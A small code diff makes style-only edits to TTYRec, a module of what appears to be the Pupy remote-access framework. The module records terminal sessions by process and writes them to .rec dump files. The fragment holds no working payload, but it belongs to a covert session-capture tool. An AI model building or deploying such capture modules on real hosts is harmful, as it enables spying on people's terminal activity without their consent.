@@ -21,7 +21,7 @@ class TTYRec(PupyModule):
     unique_instance = True
 
     dependencies = {
-        'linux': [ 'ttyrec' ]
+        'linux': ['ttyrec']
     }
 
     header = struct.Struct('<16ssIIII')
@@ -74,7 +74,7 @@ class TTYRec(PupyModule):
             usec = int(usec)
             lbuf = int(lbuf)
             key = frozenset([comm, probe, pid])
-            if not key in dests:
+            if key not in dests:
                 filename = '{}.{}.{}.rec'.format(comm, pid, probe)
                 dest = os.path.join(dumpdir, filename)
                 self.info('{} {} -> {}'.format(comm, pid, dest))
